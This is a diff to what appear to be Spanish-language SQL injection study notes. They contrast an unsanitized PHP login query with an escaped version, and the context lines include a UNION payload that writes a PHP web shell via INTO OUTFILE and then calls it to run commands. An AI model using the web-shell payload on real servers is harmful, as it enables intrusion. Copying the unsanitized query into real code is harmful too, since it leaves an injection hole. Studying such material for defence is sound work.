@@ -947,6 +947,38 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 http://SERVER_IP:PORT/shell.php?0=id
 ```
 
+### NO sanitizado
+
+```
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+  echo "Executing query: " . $query . "<br /><br />";
+
+  if (!mysqli_query($conn ,$query))
+  {
+          die('Error: ' . mysqli_error($conn));
+  }
+
+  $result = mysqli_query($conn, $query);
+  $row = mysqli_fetch_array($result);
+<SNIP>
+```
+
+### SANITIZADO
+
+```
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+```
+
 
 
 
